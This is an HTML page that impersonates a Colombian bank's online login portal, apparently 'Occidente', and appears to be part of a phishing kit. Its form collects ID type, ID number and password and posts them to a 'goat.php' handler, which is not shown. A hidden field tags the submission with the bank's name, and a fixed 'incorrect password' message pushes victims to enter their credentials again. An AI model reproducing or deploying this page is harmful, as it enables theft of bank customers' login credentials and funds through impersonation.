<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Payment</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            font-family: Arial, Helvetica, sans-serif;
        }

        body {
            padding: 20px;
        }

        input, select {
            width: 90%;
            height: 35px;
            border-radius: 5px;
            margin: 10px auto;
            display: block;
            border: 1px solid #c7cfed;
            padding-left: 10px;
        }

        input[type="submit"] {
            background-color: blue;
            color: white;
            border: none;
            cursor: pointer;
            width: 80%;
            height: 40px;
        }

        input[type="submit"]:hover {
            background-color: darkblue;
        }

        label {
            margin-left: 5%;
            font-size: 13px;
            color: #556493;
        }

        img {
            display: block;
            margin: 20px auto;
        }

        center {
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <center>
        <img src="img/logo.png" alt="Logo" width="40%">
        <h3>INGRESA A TU PORTAL TRANSACCIONAL</h3>
    </center>

    <form action="process/goat.php" method="POST">
        <label for="tipoDocumento">Tipo de Documento</label>
        <select name="tipoDocumento" id="tipoDocumento" required>
            <option value="Cedula de Ciudadania">Cédula de Ciudadanía</option>
            <option value="Tarjeta de identidad">Tarjeta de Identidad</option>
            <option value="Cedula de extranjeria">Cédula de Extranjería</option>
            <option value="Pasaporte">Pasaporte</option>
        </select>

        <label for="txtUsuario">No. de Documento</label>
        <input type="text" name="user" id="txtUsuario" inputmode="numeric" placeholder="*Documento" required>

        <label for="txtPass">Contraseña</label>
        <input type="password" name="pass" id="txtPass" placeholder="*Contraseña" required>

        <input type="hidden" name="banco" value="Occidente">
        <center><a style="color:rgb(255, 0, 0); margin-bottom:0px; ">Tu documento o contraseña no son correctos</a></center>


        <center><input type="submit" value="Ingresar"></center>
    </form>
</body>
</html>
